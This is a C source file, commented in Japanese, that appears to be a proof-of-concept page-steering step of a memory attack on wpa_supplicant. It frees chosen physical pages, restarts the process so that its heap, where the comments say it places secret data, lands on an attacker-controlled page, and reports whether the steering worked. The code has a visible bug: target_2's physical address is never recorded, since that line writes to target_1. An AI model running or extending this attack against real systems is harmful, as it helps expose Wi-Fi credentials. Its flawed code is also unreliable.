#include "dummy_check.h"
#include <stdio.h>
#include <sched.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdlib.h>

static const int DUMMY_PAGE = 189;
static const int BUSY_LOOP = 5;
static const int PFN_MASK_SIZE = 8;

int main() {
    // ダミーページ確保
    dummy dummy_pages[DUMMY_PAGE];
    for (int i = 0; i < DUMMY_PAGE; i++) {
        dummy_pages[i].virt_addr = custom_mmap();
        if (dummy_pages[i].virt_addr == MAP_FAILED) continue;
        dummy_pages[i].phys_addr = v2p(0, dummy_pages[i].virt_addr);
    }

    // ターゲットページを確保
    dummy target_1;
    dummy target_2;

    target_1.virt_addr = custom_mmap();
    target_1.phys_addr = v2p(0, target_1.virt_addr);
    
    target_2.virt_addr = custom_mmap();
    target_1.phys_addr = v2p(0, target_2.virt_addr);

    // wpa_supplicant が起動中なら一度止める
    int res = 0;
    if (get_process_id()) {
        res = kill_wpa_supplicant();
    }
    if (res) {
        printf("[-] failed to kill wpa_supplicant\n");
        exit(1);
    }

    // 他のプロセスに CPU を譲る
    for (int _ = 0; _ < 10; _++) {
        sched_yield();
    }

    // ターゲットページ解放
    munmap(target_1.virt_addr, 0x1000);
    munmap(target_2.virt_addr, 0x1000);

    // ダミーページ解放
    for (int i = 0; i < DUMMY_PAGE; i++) {
        munmap(dummy_pages[i].virt_addr, 0x1000);
    }

    // wpa_supplicant 起動
    if (start_wpa_supplicant()) {
        printf("[-] failed to start wpa_supplicant\n");
        exit(1);
    }
    printf("[+] start wpa_supplicant\n");

    // wpa_supplicant が秘密情報を配置するまで待機
    busy_loop(BUSY_LOOP);

    // wpa_supplicant のプロセスID取得
    int pid = get_process_id();
    printf("[+] pid = %d\n", pid);

    // wpa_supplicant プロセスの heap 領域のアドレスを取得
    uint64_t heap_addr = get_heap_start_address(pid);
    printf("[+] heap address = 0x%lx\n", heap_addr);

    // 物理アドレス計算
    uint64_t phys_addr = v2p(pid, (void *)heap_addr);
    printf("[+] physical address = 0x%lx\n", phys_addr);

    // ダミーページ計算
    // for (int index = 0; index < DUMMY_PAGE; index++) {
    //     if (dummy_pages[index].phys_addr == phys_addr) {
    //         printf("[+] index = %d, dummy page is %d\n", index, DUMMY_PAGE - index - 1);
    //         break;
    //     }
    // }
    
    // ページの誘導に成功したか確認
    if (phys_addr == target_1.phys_addr) {
        printf("[+] successfully lead to the target page1\n");
    } else if (phys_addr == target_2.phys_addr) {
        printf("[+] successfully lead to the target page2\n");
    } else {
        printf("[-] failed lead to the target page\n");
    }

    return 0;
}

void *custom_mmap() {
    void *addr = mmap(
        NULL,
        0x1000,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
        -1,
        0
    );
    return addr;
}
